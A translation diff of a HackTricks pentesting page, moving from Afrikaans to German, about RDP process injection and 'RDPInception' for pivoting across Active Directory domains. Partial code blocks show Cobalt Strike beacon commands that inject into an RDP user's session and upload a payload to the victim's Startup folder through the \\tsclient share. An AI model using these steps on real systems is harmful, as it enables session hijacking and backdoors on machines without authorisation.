@@ -15,11 +15,11 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-## RDP Proses Inspuiting
+## RDP Prozessinjektion
 
-As die **eksterne groep** **RDP-toegang** tot enige **rekenaar** in die huidige domein het, kan 'n **aanvaller** daardie rekenaar **kompromitteer en op hom wag**.
+Wenn die **externe Gruppe** **RDP-Zugriff** auf einen **Computer** in der aktuellen Domäne hat, könnte ein **Angreifer** **diesen Computer kompromittieren und auf ihn warten**.
 
-Sodra daardie gebruiker via RDP toegang verkry het, kan die **aanvaller na daardie gebruiker se sessie pivot** en sy toestemmings in die eksterne domein misbruik.
+Sobald dieser Benutzer über RDP zugegriffen hat, kann der **Angreifer zu dieser Benutzersitzung pivotieren** und seine Berechtigungen in der externen Domäne missbrauchen.
 ```powershell
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -43,13 +43,13 @@ PID   PPID  Name                         Arch  Session     User
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-Check **ander maniere om sessies te steel met ander gereedskap** [**op hierdie bladsy.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+Check **andere Möglichkeiten, um Sitzungen mit anderen Tools zu stehlen** [**auf dieser Seite.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-As 'n gebruiker via **RDP toegang tot 'n masjien** kry waar 'n **aanvaller** op hom **wag**, sal die aanvaller in staat wees om 'n **beacon in die RDP-sessie van die gebruiker** te **injekteer** en as die **slagoffer sy skyf gemonteer het** toe hy via RDP toegang verkry, kan die **aanvaller dit toegang**.
+Wenn ein Benutzer über **RDP auf eine Maschine** zugreift, wo ein **Angreifer** auf ihn **wartet**, kann der Angreifer einen **Beacon in die RDP-Sitzung des Benutzers injizieren** und wenn das **Opfer sein Laufwerk** beim Zugriff über RDP **gemountet hat**, könnte der **Angreifer darauf zugreifen**.
 
-In hierdie geval kan jy net die **slagoffer se** **oorspronklike rekenaar** **kompromitteer** deur 'n **backdoor** in die **opstartgids** te skryf.
+In diesem Fall könnten Sie einfach den **ursprünglichen Computer des Opfers** kompromittieren, indem Sie eine **Hintertür** im **Startup-Ordner** schreiben.
 ```powershell
 # Wait til someone logs in:
 net logons
@@ -82,16 +82,16 @@ beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start
 beacon> upload C:\Payloads\pivot.exe
 ```
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
 </details>
 {% endhint %}
